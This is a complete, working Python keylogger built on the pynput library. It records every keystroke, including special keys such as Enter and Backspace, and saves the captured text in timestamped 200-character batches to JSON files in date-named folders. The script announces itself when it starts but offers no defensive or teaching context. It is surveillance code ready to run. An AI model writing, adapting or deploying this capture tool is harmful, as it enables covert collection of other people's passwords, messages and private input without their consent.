from pynput import keyboard
import json
import os
from datetime import datetime

# Setup: directory based on date
today_str = datetime.now().strftime('%d%m%Y')
base_dir = os.path.dirname(os.path.abspath(__file__))
log_dir = os.path.join(base_dir, today_str)
os.makedirs(log_dir, exist_ok=True)

# Log file
log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%H-%M-%S')}.json")

# Batching
char_buffer = ""
batch_log = []

def write_batch(batch_text):
    batch_entry = {
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "batch": batch_text
    }
    batch_log.append(batch_entry)

    # Save to file
    with open(log_file, 'w') as f:
        json.dump(batch_log, f, indent=4)

def on_press(key):
    global char_buffer

    try:
        char = key.char
    except AttributeError:
        # Convert common special keys
        char = {
            'Key.space': ' ',
            'Key.enter': '[ENTER]',
            'Key.tab': '[TAB]',
            'Key.backspace': '[BS]'
        }.get(str(key), f"[{key}]")

    char_buffer += char

    if len(char_buffer) >= 200:
        write_batch(char_buffer)
        char_buffer = ""  # Reset buffer

def main():
    print("[*] Keylogger started. Capturing in 200-character batches.")
    print(f"[*] Log output: {log_file}")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
